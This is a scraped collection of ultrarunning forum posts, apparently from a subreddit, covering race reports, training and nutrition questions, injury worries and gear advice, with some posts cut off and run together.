At about 13 hours in, the sun had set and I pulled out my headlamp. The race was incredibly well marked, however in the dark the flags became harder to see. (sometimes the flags would fold over their own reflective sticker) After 13 hours of racing I was beginning to disengage a bit, which led to a few times where I wasn’t sure if I had missed a turn or not. I never actually did miss a turn, I just spent a bit of mental energy worrying if I had, and a couple of times I backtracked a short distance to find a flag. I just put this down to racing inexperience mostly. Around this time was when I started using my caffeinated Nuun tabs, which helped perk me up for the night.

I spent the rest of the second lap plugging away slowly. It had begun to rain on and off, but the trails still felt good and it didn’t affect me. I met a lot of 100 km runners in this section, who only had about 15 km to go. It surprised me to see that nearly everyone I met was not in a good mental state, despite being so close to the finish. I credit my good mood at this point to consistent calories and plenty of experience with night running. On the last few legs of the second lap, I realized that with my plan of moving deliberately slower, my lap time was going to be right around 11.5 hours, which meant that I had 13 hours to finish my final lap. At this point I was confident I could repeat my 11.5 hour lap without too much trouble, so it seemed that my ‘move slowly and eat a lot’ strategy would pay off.

As I finished my lap and came into the aid station, I saw some other 100 miler runners for the first time in many hours. Each lap begins with a 7 km loop that returns to the start/finish line, and after chatting a little bit while refueling I learned these runners had already done that loop. There were five runners there, and they all looked pretty wrecked, lounging deep in chairs near a heater or lying down on air mattresses. This gave me a big boost of energy and I realized I might be able to pick off a few runners on my last lap. I wished everyone good luck and headed out as the rain began to pick up. My plan was to go the same pace as my second lap, and pick it up in the last 20 km or so if I had anything left in the tank.

Powerlifting programming while training for a 55k?,"I’m doing a 55k in December. My goal is really just to finish, I don’t care about being competitive with anyone but myself. I’m running about 40MPW but will hopefully be hitting around 50MPW deeper into the training cycle.

Currently I’m also running NSuns. I was doing 5 day, then moved to 4 day to give myself another running-only day. I’m starting to feel my lifts become much harder as I bump mileage up and add in speed work here and there. My caloric intake has been in a slight surplus and I’m getting 8+ hours of sleep every night.

I have just started back at work in a very physical job, picking up and lifting heavy things, lots of walking, physical labour etc, will this be okay to continue doing a week before race day?

Crazy foot issues. Anyone ever see or experience anything like this?,"Yesterday I finished the Teanaway Country 100. After about 40 miles I felt a bubble on the bottom of my heal. It almost felt like I was wearing some nike shoes with the huge bubbles on them.

I checked it out at an aid station and it was so deep that you couldn't even tell there was a blister there. Since there was nothing obvious to do about it I kept running. 

At about mile 60 I noticed this happening on my other foot and the original blister was spreading so it felt like most of my heal was a giant blister.

As the race continued it got worse and worse eventually spreading to the entire bottoms of my feet. The best way I can describe it is like I was wearing socks made out of my own skin. 

On downhills my feet would slide to the front of my ""sock"" and then they'd slide back as soon as the ground evened out. This was, as you can imagine, very uncomfortable. Any uneven ground or rock caused my foot to shift in its own skin, sometimes with extreme pain. At one point I thought my sock had fallen down my ankle into my shoe. It wasn't my sock, it was the skin of my foot rolling up.

Here's a photo. Warning, these feet grossed out the seasoned ultra runners at the finish line.  
https://imgur.com/a/9osyO8V

First 50k in April 2022,"Every year I try to do something new that challenges my mind and body. In the past, I’ve run a marathon, done an Olympic triathlon, and a 3-day 75 mile backpacking trip. My goal is to eventually do a 50-mile run. 
A little about myself: I’m 42 yrs old, 5’11” 200lbs. I do not have a “runner’s body.” I work for UPS so I have a very active job. I get between 15k-20k steps a day. Right now I can go run 8-10 miles on demand @ about a 10:00 min pace. I’m not a runner that wants to podium. I’m more interested in just doing the best I can and completing the event. I also mountain bike on the weekends. 
With this in mind, I’m looking for advice regarding all aspects of a 50k trail run. Everything from: nutrition during and after the runs (I sweat ALOT and can get headaches if I don’t drink/eat enough; and I don’t ever feel the difference if I eat Gus or gels), training schedules (looking for something that will mesh with my ups job) and clothing (right now I wear basketball shorts and quick dri UA or Nike shirts; because I sweat a lot these can get uncomfortable. I’ve been looking at the Exoskin line of compression wear). I ran my marathon in basketball shorts and ate whatever they had at the aid stations (which I regret). 
It’ll be hard to train daily as I put in about 9-12hrs a day at work. November and December will be nearly impossible to train except on the weekends. Christmas season will be 14hr days. 
I want to start training now so I can slowly build up to April. If I wait until 3 months before the run then I’m afraid that’ll be too much, too quick on my body and I’ll injure myself. 

Sorry for the long post,  it I tried to get all the info in it. Thank you in advance for any advice!",ultrarunning,1631578690
Two months out from first 100 miler - struggling mentally - I don’t enjoy running anymore,"I have my first 100 attempt early November. I’ve been training since January. Completed my first 50 miler in July, it went well all things considered. Unfortunately it took me way longer to recover from that race, considering it was really just part of my 100 mile training block. Since that race, my motivation has just been sucking lately. 

Honestly, I hate running right now, it doesn’t seem fun anymore. I really just want to move on and lift weights again (my first love is CrossFit type lifting, and I pulled back on it to run more). 

Is that common when training for 100s?",ultrarunning,1631529130
Looking for ramp-up/base maintenance plan ideas or resources,"I'm working my way back from some minor injuries and looking to build some structure and intentionality back into my weekly running.   Right now just sort of throwing some random road/trail runs in each week to keep myself moving.  As of now I'm not training for any ultra or trail race or event but hope to once I've got a good base.  

Hoping to either design myself or find an easy online plan that can help me slowly ramp up to a good 30+ miles per week base that mixes all or some of road, trail, speed, slow/long runs, strength, xt, hills/elevation gain, etc.  

Anyone successfully done this before?  Looking for either some tips, easy guidance, or any sort of online training plan that may work well for ultra/trail runners, but is not specific for an event or race.   

Seems most of the online running plans are tailored toward a specific distance event, but I'm hoping for something that focuses more on creating and maintaining a base.

It could not have gone any better for my first 50.

What watch to buy? Restricted budget,"Hi all,

What watch do you recommend for a fellow Ultrarunner to buy? My budget is 300-400€. I would like to pay less. I don't need to fancy functions. I think a battery time is one of the most important in comparison to data.   


I have looked at:  
Garmin Instinct Solar  
My eye caught this due to it looks. The brain due to it's price and battery. I really like it. But - it is missing the VO2 estimation, recovery data etc. I am not sure if this will bother me or not. GPS and wrist HR works good on this model. I will not have to care so much about battery due to its battery saving tweaks when running 12-24 hours runs.  
Price for a new is 235€. An amazing price I would say for a new Garmin watch.

Coros Pace 2  
Battery monster as well, cheap and alot of data. I can get this for 170€, new. What I do not like is it's ecosystem (I do not know anything about it). I don't know so much about how much I can tweak the battery usage. But as I understand I should be able to run 12-24 hours easily. I think it says 30? hours in GPS-mode. Downside is that it's only offered in white. I am not sure I really like that color on my wrist 24/7. Any reviews on this watch here from other ultra runners that are in this ecosystem already?

Suunto Spartan Ultra  
An old Suunto, that I actually already own. It's ok and it has the data I need for running. But yea, the battery starts getting old and I am not really comfortable with the ecosystem and I'm having a bit trouble tweaking the battery to get out more than 16 hours from this when running. That is a big issue for me before next season when running up to 24 hours. But maybe I've missed some settings?

I just ran my first ultra marathon!,"Labor day weekend I raced at the Blood Run during the 24 hour period. It was pretty exciting and addicting. I love the people so much. I ran and talked with so many awesome crazy people who understand my passion for running. God I love this community. The entire time we were encouraging and looking out for each other. I learned so much from everybody. The organizers, other racers, volunteers, Justin's Mom. It was so awesome. 
I met a guy who just ran his 213th 100 mile race! I got ran into by the owner's pet deer. The best part of all if I only got two blisters on my left foot🤣🤣 I was expecting the wear and tear on my body to be way worse but honestly I could have gone on a run yesterday if I really had wanted too.",ultrarunning,1631218205

I will add in a few more back to backs and make a couple of those involve sleeping rough to test my equipment.    Apart from that is there any other changes or shift in focus I should be looking at?",ultrarunning,1631217432

\### Training

I had been training for a 50 miler (Overlook Endurance Runs) for September 11th which got canceled due to the Caldor fire. My training was based around this race which I assumed to be quite warm so I was doing some heat training. I found an alternative, smaller race near San Diego, that was also much longer than I was training for. 

Since end of February, after recovering from a stress fracture I held 80km/50mile weeks training for a 50k in April. Post that race I kept up 80km/50mile weeks and did my first few road races (10k in May, 5k in July) while keeping long runs on the trails. In late july/august I hit some big weeks for me (111/121/113/100km) with longer runs (but no back to backs). My longest run was 60km/37miles and a few days later did 28miles for a birthday challenge. That week was a bit too intense and I went into an earlier taper than I was expecting to recover and did 45km (with a sad excuse for a half marathon trail race 3 weeks from race day), then 53km, then 28k the week of the 100k race. I kept up the heat training into the last week before the race.

\### Pre-race

Rented a hipcamp camping spot the night before about 25 mins away from the race. Woke up at 3am, had a PB and banana sandwich and coffee. Luckily had to use the restroom immediately. Drove from where we were staying and got to the parking around 4:15am. Had an ez-up and cooler that I set up for my girlfriend to hang out by. The course was 8 laps, reversed every other lap, so we could just set up camp. It was already warm at 4:30am. I started out in a dryfit shirt and my salomon adv skin 12 vest with the 500ml flasks and my candy for the first loop. There were only 13 people starting the 100k. 

\### Race

There we 13 people starting the 100k and the group started off so fast! Half of the field took off down cardiac hill. I hung out with the group in the back and it felt pretty comfortable. It was slightly faster than the pace I had planned for my ""dream"" time without the heat for 14:30 pace but I went with it for a while. I was embarrassed at the time, thinking that I would come in last place. I figured that if everyone else was going at that pace that I could at least hold on to the back pack. I ended up hanging out with S for the first three laps and part of the 4th. We took it ""easy"" which was still right around the 14:30 plan that I had made. It was still reasonable cool for the 2 laps, but the third started getting pretty warm. By 9am it was around 90F/32C.

After finishing lap 3 was when the ""fun"" started. On the 4th lap I ended up switching to full sun-avoidance mode and changed to my sun shirt and handhelds. S ended up leaving the aid station earlier and I thought I wouldn't see him again. That first lap in the heat was pretty brutal but managed to make it back to aid station relatively uneventfully. The even laps were a bit easier since the time between aid stations was a bit less due to running downhill on the longer section. Then I started putting ice everywhere I could before starting the laps. The ice-buff necklace was a life saver. I also filled up my hat and my shirt with ice. It actually stayed cold for about an hour which would get my to the mid-way aid station. This format was super nice for dealing with the heat since it was manageable for about 2 hours. Next time I would have a different hat that didn't flop around so much and a lighter sun shirt. I was drinking close to 2 20oz handhelds (1 with skratch and 1 with water) every hour.

My nutrition plan was pretty simple (and cheap). Start with Scandinavian swimmers (Trader Joe's version of Swedish Fish) for as long as I could stomach them \~ 6 every half hour (100 kcals), and switch to candied gingers (also from Trader Joe's) when my stomach needed something different. I also always had half fluids of skratch (I assume this was about 350mg of sodium and 80kcals for a bottle) and half plain water. I had planned on mixing in some gatoraid but the skratch continued to taste good the entire day. The first few laps I think I ate a bit off schedule but it was at least 200 kcals/hour of food so with the skratch and random sips of coke/mountain dew it was between 250-300kcals/hour, every hour until the last 30 minutes I skipped out. At lap 6 it hurt to chew so I switched to SIS isotonic gels till the finish. At the aid station I'd sip on coke or drink coconut water and swig some pickle juice. Literally only sugar for 16 hours and I estimate I consumed between 1000-1200g of sugar (4000-4800 kcals). The first thing I did when finishing was to brush my teeth, I should have done this after lap 5!

I hit 50km in about 6:51, and finished the 4th lap in 7:13. This was now midday and there was also a half-marathon and 50k going on at the same time. There were so many people that were overheated and lots of the 100k'ers were tending to people that ran out of water or were overheated. It hit 104F/40C in the canyon at the hottest part of the day. It was super dangerous conditions and lots of people dropped or had to be driven back to the start. One person was taken away by the paramedics. Once I did the first lap in the heat though I knew that I could do it with my icing strategy. I would literally fill up every part I could put ice into and sounded like someone mixing a thousand drinks at a bar. It was ridiculous but it works. I spent way more time at the aid stations because of this but I think it made a huge difference.

All this time I thought I was in close to last place. It wasn't until lap 6 that I caught up to someone I thought was in the front pack. He was surprised to see me and said he thought he was going to get first and DNF. Turns out there was only a women ahead of him. I walked with him for a while and chatted since he was dealing with some pretty bad cramps. I went on ahead after a while and once I got to the end of my 6th lap and it cooled down, I knew I had it. The 7th lap was tough and my toes hurt but I kept moving. Running hurt about the same as walking so I just kept running. 

The last lap was wild. I got into the aid station, grabbed my headlamp and started off. I saw the two other guys behind me that were about 15 minutes back. The one guys said he was going to catch me so I ""raced"" the last lap. I was really slow down the hills since my quads were shot and my toes were bruised but ran the flats ""hard"". I kept checking the trails for other headlamps but didn't see anyone behind me. The ended up running all but the steepest hills for the final lap to make sure that I got under 16 hours. Final time was 15:54, 2nd OA and first male.

\### Post-race

Somehow I won prize money for being the first male ($100). Not at all how I had anticipated the race going. Felt super nauseated and sick after I finished since I pushed so hard up the hill. I dry heaved a bunch of times  and had super bad chills. Once I felt a bit better the first thing I did was to brush my teeth. I would  definitely brush my teeth mid race next time. I stayed till all my new friends came in to finish and then headed out. Ate a small portion of pasta and a larabar and then slept (terribly).

Recovery has been great and back to running today just a few days later. Really excited and happy about my performance. It was one of the hardest and most fun things I have ever done and I can't wait for the next one.

I had been planning to run a 75M in mid-October on a looped course – I'm wondering if I should just do the damn thing and go for 100M. The logistics are quite a bit more complicated by wrapping up in the wee hours of the AM instead of just before midnight - for example I'd probably need to set up a tent to crash in overnight, I'd need to find a solution to recharge phone batteries, etc. Looking for advice on what else could make the difference if I go for those last 25 miles.",ultrarunning,1631196053

I'm just over 10 weeks out from my first 50M and am churning out some good miles...on a standard (read:  free on the internet) 5 days a week plan inching toward 50MPW right now with a few weeks coming up closer to 60MPW with my TWT in the high single digits, Saturday run being my long run and Sunday run being half that.  I ran my first 2 50K's (and DNF'd a 3rd due to a bee sting) earlier this spring/summer with no issues.

Is it dumb to sign up for an ultra at my level of experience?,"So I've been running (mainly trail and fell) consistently for the last 2.5 years. My furthest run has been a 30k with about 1000 metres of elevation. When I finished that, I felt like I could definitely have carried on of it wasn't for my feet being sore from tendonitis. Small injuries and niggles are what have been stopping me from breaking into that marathon/ultra territory and I feel like everytime I try to increase my distances (even when very gradually), I get a small injury which sets me back a week or so. I've been to physios and tried to improve my form a lot but I can't seem to avoid these minor setbacks.

I'm now considering just saying f it and signing up for a trail ultra in November of this year. It's about 60k (3 laps of a course that I'm very familiar with) and around 1500m of elevation. Since I've started taking running seriously, I've known I definitely want to eventually do ultras. So I want to get the first one under my belt soon.

Is this a really dumb idea? I know it'll be painful but I know I could do it if I just go really slowly and steadily. I'm sick of progressing a little bit and then falling back to square one.",ultrarunning,1631175565
What’s the best/coolest/most welcome thing a pacer has done for you during a long race?,"What’s the coolest thing your pacer did for you?

Beginner’s luck and beginner’s misfortune: the Grand Traverse,"September 4th, 2020
Crested Butte to Aspen
40.5 miles

First ultra in the books! Thank you to all those in this sub who helped answer the questions I had along the way. 

The beginning: 
We started the day just before sunrise at 6am, winding our way around the base of Mount Crested Butte with views of the foggy valley below peeking out between Aspen groves. My running partner and I were feeling great, riding high on the energy of race day. We had signed up for the Grand Traverse spur-of-the-moment back in May, inspired by a particularly fun day of trail running. We are not inexperienced runners, but brand new to ultras and both coming off long breaks from running. We had trained hard all summer and were excited to see what we were capable of now that we had finally reached the start line. I knew we were both a bit undertrained given our short training period, but fully believed that we were both capable of finishing. 

Four miles in, my running partner stumbled and tripped, her arms flying out in front of her. I had done the same thing a couple weeks earlier, ending up with a nasty bruise on my knee that had mostly stopped aching in time for race day. I figured she’d be dealing with a nice scrape and bruise too, but nothing she couldn’t run through. She hopped up and turned towards me, and I felt the color leave my face. Instead of blood, I saw the white of fatty tissue and bone. She cried out in shock and stumbled backwards off the trail. A couple that had been just behind us immediately offered their assistance, pulling out a much more equipped med kit than my own. Another runner who happened to be a nurse stepped in to help as well. I was so appreciative for these kind and selfless people who I knew were giving up precious time. Fortunately, we still had service and I contacted race support, figuring out how we could get my friend off the trail and down the nearest road. After our new friends had her wound sufficiently compressed, she and I began a slow journey back the way we had came, towards a trail that would lead us down towards a service road. We were both heartbroken, knowing that the day had ended before it had even really began. We ran into the sweep along the way and explained what had happened and where we were headed. Ten or so minutes later, he appeared back behind us on the trail. “Hey, I just spoke to race support, and they said that you should continue on if you’d like. I can help your friend the rest of the way down.” I looked back and forth between the sweep and my friend. “Go!” she yelled. “Are you sure?” “Yes, go!!” Well, I thought, this is not the way either of us pictured the day, but I had to at least try. I took off back the way we’d came, trying to move as fast as I could while knowing that I risked burning myself out. I was at least 45 minutes behind the last group of runners, and I was going to be cutting it close to making the first cutoff at 11:15am at the top of Star Pass. I had to push the pace, otherwise there was no point in continuing on. I knew I was going to be lucky to pull this off, but I was so grateful for the opportunity to continue and I had to try. 

I only saw one other runner in the span of almost an hour, and my doubts continued to grow. Before the first aid station, a supporter with a giant sombrero and a cowbell cheered me on. “How far behind do you think I am?” I asked. “Don’t worry about that, you just run your own race!” “No really, how far behind am I?” “You just run your own race, this is about you!”  Yikes, I thought. While I did appreciate the sentiment, there was clearly no hope for me. I was too far behind. I kept pushing, finally passing two other women at the first wet stream crossing at Brush Creek just before Aid 1, 9.5 miles in. A handful of other runners were still at the station, and I breathed a small sigh of relief knowing that I was finally starting to catch up. I just had to keep moving forward.

The middle: 
As I left the aid station, the knee I had bruised a couple weeks prior seized up. I limped my way along. Great, I thought. Not even 10 miles in and it’s already giving me problems. There’s no way I can make it if this doesn’t let up. But, sure enough, it loosened back up and I was feeling good again. It stiffened up every time I stopped moving throughout the day, but the pain was always temporary. 

I moved through Death Pass escarpment onto East Brush Creek jeep road, where I slowly began to pass other runners. It wasn’t long before the trail started to slowly ascend towards Star Pass. By this time, I had caught up to the couple that had supplied their med kit and helped take care of my friend. I kept pace just behind them, finally feeling like I had a good chance of making the Star Pass cutoff. I followed them all the way to the top of the pass, making the cutoff with 30 minutes to spare. We chatted for awhile as we descended the pass, and I let them know how thankful we were for their help. I had 2 hours to make it 6 miles to the next cutoff at mile 23.5, the summit of Taylor Pass, and I had regained much of my confidence by this point. I was still feeling strong and had managed to avoid any stomach or feet issues, my two worries. 

I powered through to Taylor Pass, once again arriving 30 minutes before the cutoff. I restocked what I needed to from my drop bag and headed towards Richmond Ridge.  There were no more cutoffs after this. I could see the Maroon Bells just behind another mountain range to my left. I knew I was going to make it. I kicked my hiking muscles into gear and moved up and over Richmond Ridge, realizing part way up that I had just completed my first marathon. 

I rolled in to Aid 4 at mile 29. I had 11 miles to go. I could feel some blisters beginning to form between my big toes. I should have reapplied Aquaphor after the last wet crossing, but it was too late now. I kept moving. I was finally beginning to feel the weight of the day. I moved through much of the next 5 miles alone, finally catching up to some other runners as we got closer to Aid 5. This gave me the motivation I needed to pick up the pace. I was getting so close. 

The end: 
I reached the final aid station at the top of Aspen mountain at 3:30pm. I knew that this final stretch was supposed to be brutal, descending 3,200 feet over five miles. The knowledge that was actually going to cross the finish line spurred me on, and I bombed it downhill as fast a I could without completely destroying my quads or risking a wipe out. At this point, the blisters were finally starting to get to me but it really didn’t matter. I was going to make it. Those 5 miles seemed to keep going and going, and the trail got steeper and steeper to the point where I almost wanted to scoot down on my butt in certain sections. It was the only time during the day where I wished I had poles. 

Finally, I rounded the corner into Ajax Park, almost exactly 10 hours and 30 minutes from when we’d started. My husband, my now patched-up friend, and her boyfriend were awaiting me. My friend and I immediately embraced. It was a bittersweet ending to a journey that we had started together and had planned to end together. I knew I would never have even made it the start line had it not been for her, and I had channeled her throughout the day all the way through to the finish line. I felt so grateful to have made it there and for the incredible support system waiting for me. Fortunately, while she did need plenty of stitches, my friend’s injury didn’t damage any bones or tendons. I know she’ll be back up and running in no time at all, and there will be mountains waiting for her. 

TLDR: Trained hard for the Grand Traverse. Four miles in, I thought both myself and my running partner were both done for thanks to a perfectly placed rock and an unlucky fall. After getting my friend to safety, I was given the opportunity to continue but didn’t know if I could catch up in time to make the cutoffs. Managed to reach the cutoffs in time and make it across the finish line! I know my friend will get her opportunity to do the same.",ultrarunning,1631033955
Maintaining “form” while running so slowly,"In the last few years I’ve gone from easy runs at 5:45/km pace to 8:00/km pace (reasons in my post history, not relevant here). This has had a dramatic impact on my form, which has had to change significantly. I still struggle with it; this slow pace just doesn’t feel natural. I’m
worried about developing a chronic injury. 

What tips can you offer to help train/maintain good form when running at these slower “ultra” paces?

Foot landing under centre-of-mass is the main one I follow (true at any pace). Any others you’ve found help transition to slow (aka zone 2) running?",ultrarunning,1630969565

Waterproof jacket gear checks?,"Hey folks, currently looking into grabbing a new waterproof jacket for the winter ultra races, and just general running.

This year I'm looking at some other brands, for example a friend has been wearing this Adidas on runs and even let me borrow it.

Permission to go far more often,"Hey y'all,

I've been running about 65-70 mpw pretty consistently as part of preparation for an upcoming Ironman (also biking 15 or 16 hours per week and swimming 20k or so per week). Every Sunday I put in a SLOW 4-5 hour long run (25-30 miles), and it's my favorite day of the week. Every time I go out the door it's hard for me to stop. Running far makes me happiest, so I've been thinking about switching from faster, more frequent runs to longer ones two or three days a week; last Sunday I went 28, then I put in 25 on Wednesday. Tomorrow I've got my long brick workout, so I'll run for an hour after a seven-hour bike, and then put in my usual 4-5 hour run on Sunday. Is anybody else distributing their mileage similarly? It seems like most ultramarathoners go that long much less frequently; am I setting myself up for an injury? So far, no niggles to speak of.  I know that this isn't optimal training to race a fast Ironman, but my biggest goal is to move in the way that makes me happiest while keeping healthy.",ultrarunning,1630704445
First 24 hour race!,"Hello all- I’m in need of some motivation and advice!

I’m (19F) due to run my first 24 hour race tomorrow at noon and I’m feeling very nervous.

The race itself is a 5 mile loop and I’m planning to mostly run-walk with plenty of breaks if I need it. I have no idea how far I’ll do but I have a vague goal of 30- 50 miles (depending on how much I want to die haha.)

Overtraining at low mileage?,"I sprained my ankle really badly last fall and took a few months off running to actually do my physio exercises, then started building back my base by following a half-marathon training plan, with the intention to use that as my first training block before starting back into my ultra training plan (which starts at around 50km/week) with the eventual goal of a 50M next spring. I've previously used this training plan for a 55km and a 65km race successfully (""success"" defined here as ""finishing without injury,"" not ""smashing course records"").

I was feeling strong and powerful until I hit about 30km/week in July. This was right about the time it got crazy hot and humid here, so I decided to take a few easy weeks, because I could definitely feel myself struggling and my paces were getting slower, along with my HR getting much higher. I did a few weeks of 30km mileage, then took a two-week break due to a vacation (though subbed in lots of paddling and hiking). 

Now, however, fall has hit, the air is crisp, and here I am struggling to run a 10k on relatively flat roads. My legs feel like they're made of lead, and my HR makes me look like I'm an overweight smoker in my 80s instead of a relatively fit 35 y/o (though I acknowledge that since I'm using a wrist sensor this isn't necessarily super-accurate).

Is it possible that I ramped up too fast post-injury? Did I have asymptomatic COVID that damaged my heart? Has some prankster filled my shoes with ball bearings? I'm a little embarrassed to even be posting here given my current weekly mileage, but given that this has thrown my intended schedule for an ultra way off, here I am!",ultrarunning,1630680480
Anxious about loss of miles close to race day,"I am two weeks out from doing my first 50-miler and my body has decided to capitulate. I have had a pretty solid training block (averaging 100km per week) but recently my glute has been giving me grief mid-run. After grinding through it several times, I opted to rest this week and have been to see a physio. He reckons it's just *very* tight, so gave me a deep tissue massage, recommended I take some more time off, and try running again in a day or two.

Mentally, I am struggling with the situation and the loss of miles this week. I know that this close to race day, it's near impossible to improve - I constantly tell myself this, but doubt continues to creep in. I guess this is the norm, but some reassurance would be appreciated.

I am also a little anxious that my first couple of runs back are a disaster and there is no improvement. Two weeks on the exercise bike doesn't sound like a great taper to me.

And as an aside, I have been training for this race for 16 weeks. Any thoughts on 16 vs 12 week training blocks for someone who has a solid aerobic base?

Four weeks ago I upped my protein intake from 70g to 150g (or a little more than 1g/lb bodyweight). Wow. I've burned through fat like I never have in my life and built muscle.

"What are the ""bucket list"" UK events?","In the USA they've got Hardrock, Western States, &amp; Leadville (among others) that appear to be real staples of the Ultra runners bucket list.

The only events that seem to be ones that ""everyone"" talks about I feel are more about marketing than actual bucket list type events. Things like Race to the Stones; I'm sure are fantastic events, but I think they've got where they are because of the marketing, whereas western States had built up over years to become what it is and embed it's self in the US ultra scene.

Help with estimating how much water I should bring,"Hi all, I have a question about estimating how much water I should bring with me on a solo 100K I'm planning. Basically, I'm looking at attempting an FKT (unsupported) along a flat rail-to-trail line. The route only has something like 600 ft of vertical gain (gross) over the full distance and will have net elevation loss, so it's quite flat. 

Since this is the first time I'll be attempting this distance without support, I'm wondering how I should estimate my hydration needs. **Are there ways to calculate how much water I'd need per hour or per mile?** I have time to test hydration equations.

A Google search didn't yield reliable information – One blogger recommended 1L per hour, which seemed excessive and would be too much for me to carry. And I can't really go off of any race experience as I often re-fill my flasks at every opportunity as a precaution. 

Some additional details that may help:

* Looking to run later this fall in cooler weather (shooting for highs in the 50s F)
* I'm estimating the run will take me about 12 hours without support
* I regularly run marathon distances with just two 750 ml soft flasks
* Not concerned with nutrition as I have a pretty good grasp of how many calories I need per hour to keep moving

If needed, I could pull off the run and purchase water from one of the towns the route goes through, which would bump the attempt to the self-supported category. This would be okay but I'd like to try and carry it all with me if I can.

I recognize we all have different needs, but I don't really know where to even start with estimations. Should I just triple what I normally take for a 25ish mile run?

- Expecting to take around 15 hours, but only 12 hours of light, should we start SUPER early to target finish before sundown (so start like 2am) or fine to start around 4am and finish in some darkness?

- Packing around 3-4k calories, mix of sweet potatoes, pb&amp;j sandwiches, trail mix, gummy bears, protein+granola bars, electrolyte tablets, drink mix. Any other good items to pack and bring? We can also get some real food somewhere in the middle right?

Someone please tell me your story of meniscus repair. How does this affect later in life? I'm afraid I'm going to lose my legs later in life.,"I was a fucking idiot. I increased my milage way too much. Nobody ever told me the price for an injury was a ruined life. I thought it would at max be a year recovery. Not permanent damage. Not a meniscus repair that gives me arthritis, that then needs a knee replacement, that leads to agony and immobility later in life.

I can't fucking believe that this is happening to me.

The doctor thinks it's a meniscus injury. I've been off for 4 months from running. My knees are only getting worse. I fear that the tear is worsening. I'm going to call in to speed up the MRI, because 8 weeks isn't enough. I think the difference between grades of injury, and thus the implications for the rest of my life will be made on these weeks. 

I fear that at best, I'll need to trim to meniscus, causing me to lose my knees eventually. 

Am I never going to return to running again? How the fuck can I?

Is this shin splints?,"Around four years ago I suffered an injury to my right leg during a coastal hilly ultra. The pain onset was gradual, but as I was 10 odd mile from the finish I hobbled on and literally limped over the line I real pain. I distinctly remember that the pain was far worse when walking, and seemed to subside when running, hence why I kept running! I ended up in A&amp;E the nex day, told it was not broken, but was in a boot and off work for two weeks. The pain was a few inches above the ankle on the front of my leg, lower shin area. 

Fast forward many years and this injury is a distant memory with many races done since. But this weekend I was 46 miles into another ultra when I felt a instant, yet mild pain in the same place. I knew it was back. Right enough when I stopped running it was worse, and running make it better, but then the subsequent stop was worse. Knowing how this story goes I called it a day and pulled out from the race.

A few days later and I have no pain walking whatsoever, but just three inches above my ankle, just to the right of the bone is area tender when I press with my finger.  When I tense the muscle however, the tenderness dissapears!

Well, the allure of Ultrasignup was too strong and I just signed up for a 12 hour looped race with 3000 feet of gain per 4 mile lap. It is in 7 weeks and my fitness base is not skewed towards hills. I am totally aware that I am screwed - but the post is not about trying to become a climbing/descending beast in that time span. I am just trying to get in some solid strength training in addition to the amount of vert I can safely fit in to minimize injury risk. I am quite young, so I generally recover from strength and workouts well.

What do you like to incorporate in order to maximize leg strength for descents? The climbing doesn't worry me at all, I am a strong power homer with trekking poles. I am currently planning on the following 2x a week: Rear lunges with a small dumbbell, Bulgarian split squats, Romanian deadlifts with 5-10lbs, and box step ups. Basically David Roche's 8 minute speed legs. Anyone have additional exercises they like?",ultrarunning,1630337170
Yoga program for s&amp;c,"I’m getting close to doing my first ultra distance (45-50k-ish) and feel like I need to do some proper s&amp;c and stretching now with the increased training distance, especially if I want to ramp it up to longer distances afterwards. 

I’ve done some yoga in the past, but often feel like I don’t get enough training benefit from it (stretching and mobility, though, it’s brilliant), but I also feel like I need a little bit more fun than just strength exercises in the living room after the kid is tucked in. 

Is there some good internet resource where I can find, say, five different 20 minute yoga practices that I can do as my  strength, conditioning and mobility routine? Anyone that’s had good results/experiences with something similar?

Thanks!",ultrarunning,1630322734
The little story of my 50km trail race after 2 months of bad training,"Ok I know a 50km run is barely considered as ultra running, but

I never ran in my life

Did olympic weightlifting as a teen and got good , started breaking local records.

I also got into bodybuilding after and bulked up for 86kg for 177cm

Then i got interested into alpinism and running

My first run session was about 2km in 25 minutes with lot of pain everywhere, still weighing 85kg and with sneaker 

Second session I did 20 kilometers in 2h30 minutes.
It was a flat trail '

Then i got injured 5 months ago.
 Couldnt run nor walk without pain  for 2 months so i stopped everything and dropped weight to 73kg

Then i a ran a little bit, like 10km in 1h30 wich was bad but only because i had weird pain in  my Calf

During the last 3 months, I have never ran more than   5km continuously  because of pain everywhere

One day I managed to run 8km in 40 minutes

Then i took a break to walk in the alps
Only 2 running training here

I was back in town, absolutely no serious training and never Ran more than 15km since my bad 20km run before my big injury. 

i have done 4 or 5 painfull run during this time and injured myself in high tight

But two days ago, after being impressed by killian Jornet, I decided that today I was going to run 50km. 

I still had my thight injury but i felt great 

Ran the 30 kilometers in 3 hours 12 minutes, 

Ran the 41 kilometers in 4 hours 25 minutes

And ran the 50 kilometers in 5 hours 30 minutes with

 two 10 minutes breaks  and multiple 20 seconds breaks 

I felt good, and i could hold the 10 kilometers per hour for hours, but my tight injury Prevented me from doing so, but that's no excuse, I don't think I could have done better. I ran low pace, breathing was easy, everything was good.


But i only took 4 little bottle of 90g of mashed apple  wich represent 20g of carbs per bottle wich is not a lot
. Since i had no running kind of backpack. 

I think I would have needed 200 calories of carbohydrate per hour. 


I really think if i managed to do a 50km run in a OK time without any proper training in just 3 months post  big  injury, I'm on the right path 

And yes, it was a mistake to run this far without proper training or anything. I'm not going to do it again for a while. 

In addition, as I had no water on me, I had to stay close to a tap, which forced me to do trail running on the same trail  circuit for 5 hours. 

And i couldnt run uphill or downhill because of my tight injury, Fortunaly i am near Paris and the highest point is 200m. 
What do you think? If i made mistakes, im sorry, im french.",ultrarunning,1630316574
First 50 mile. Training run has me concerned.,"Hello,

I have a 50 mile ultra in ~1 month. The vert on it is about 6,000 ft. I did a training run yesterday (long run day) which was 21 miles with about 6,000 ft. At the end of it I was dead. The run was three loops up to a peak and I walked the uphills  and ran the downs as much as I could (really no flats). The third loop I could not stay in zone 2, even on the downs. 

My long run before this was 28 miles with 4k vert and I didn't feel nearly as dead. And doubled up the next day for another 10 miles. 

Should this concern me? 

Thanks in advance.",ultrarunning,1630276336
Salomon adv skin 5,"Thoughts anyone? I recently bought the Salomon Advanced Skin 5L hydration vest. I got it for an upcoming 50k (first ultra for me, hopefully many more to come). 

I love the pockets and stretchy fabric, but here are two things I’ve noticed and I am wondering if anyone else has experienced this. 

1) I am struggling getting it to really dial in fit-wise. Mainly an issue when I use the front two water bottle pockets. That weight seems to make it bounce. I have to really pull the cord to make the chest tight but nothing seems to really settle it in. Based on measurements I am a medium but not far from a small. Wondering about smaller size?

